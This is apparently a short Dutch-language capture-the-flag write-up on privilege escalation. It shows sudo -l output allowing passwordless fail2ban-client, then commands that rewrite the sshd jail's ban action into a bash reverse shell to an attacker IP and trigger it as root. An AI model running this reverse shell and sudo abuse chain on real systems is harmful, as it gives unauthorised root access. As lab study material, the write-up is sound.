## privesc

#### Sudo -l

*Schrijf commando*

```
sudo -l
```

```
Matching Defaults entries for asterisk on ip-10-10-249-94:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-249-94:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```
**Onze gebruiker mag /usr/bin/fail2ban-client runnen**

```
/usr/bin/fail2ban-client
```

**optie om een custom ban commando uit te voeren:s**

```
get <JAIL> action <ACT> actionban        

gets the ban command for the action <ACT> for <JAIL>
```
**Commando aanmaken in fail2ban, zodat we met sudo rechten een reverse shell kunnen aanmaken**

```
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.63/9003 0>&1'"
```

**Commando om deze service met sudo rechten uit te voeren die we zojuist hebben aangemaakt.**

```
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.5
```

